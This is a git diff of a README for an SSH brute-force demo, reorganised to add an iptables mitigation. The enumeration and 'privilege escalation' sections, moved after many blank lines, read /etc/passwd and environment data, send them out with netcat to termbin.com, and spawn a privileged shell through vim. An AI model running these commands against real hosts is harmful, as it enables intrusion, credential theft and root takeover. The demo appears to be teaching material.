@@ -1,7 +1,7 @@
 # Bruteforcing-SSH
 ========
 
-This is a demo which will exploit SSH on a linux host. Once SSH access is gained, privilege escalation is used to become root. *Note* this README and demo is still under developement.
+This is a demo which will exploit SSH on a linux host. In this demo we also show you how to mitigate the risk using a simple `iptables` rule. Bonus section: Once SSH access is gained, privilege escalation can be used to become root. *Note* this README and demo are both still under developement.
 
 
 Downloading Dictionary Files
@@ -126,34 +126,6 @@ Now you are connected to a shell on the target. try typing some basic shell comm
 
     hostname -f
     uname -a
-
-# Enumerating a Host
-------------
-
-connect to the target using the discovered credentials
-
-    ssh graffias.openincite.net -l podman
-    id
-    sudo -l -U podman
-    
-podman appears to be a non privalaged user. Let's see what we can find out about the system...
-
-    ls -lah $PWD
-    firewall-cmd --list-ports >> $HOSTNAME.txt
-    prinenv >> $HOSTNAME.txt
-    cat /etc/passwd >> $HOSTNAME.txt
-    yum list installed >> $HOSTNAME.txt
-    
-Let's grab a copy of the information we've collected 
-
-    cat $HOSTNAME.txt | nc termbin.com 9999
-    
-# privilage escalation 
-------------
-Use vim to hide our shell
-
-    vim 
-    : ! /bin/bash -p
     
     
 # Protecting a host from bruteforce
@@ -182,3 +154,71 @@ Now run the brute force exploit again and observe the behavior
 
     exploit
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Enumerating a Host
+------------
+
+connect to the target using the discovered credentials
+
+    ssh graffias.openincite.net -l podman
+    id
+    sudo -l -U podman
+    
+podman appears to be a non privalaged user. Let's see what we can find out about the system...
+
+    ls -lah $PWD
+    firewall-cmd --list-ports >> $HOSTNAME.txt
+    prinenv >> $HOSTNAME.txt
+    cat /etc/passwd >> $HOSTNAME.txt
+    yum list installed >> $HOSTNAME.txt
+    
+Let's grab a copy of the information we've collected 
+
+    cat $HOSTNAME.txt | nc termbin.com 9999
+    
+# privilage escalation 
+------------
+Use vim to hide our shell
+
+    vim 
+    : ! /bin/bash -p
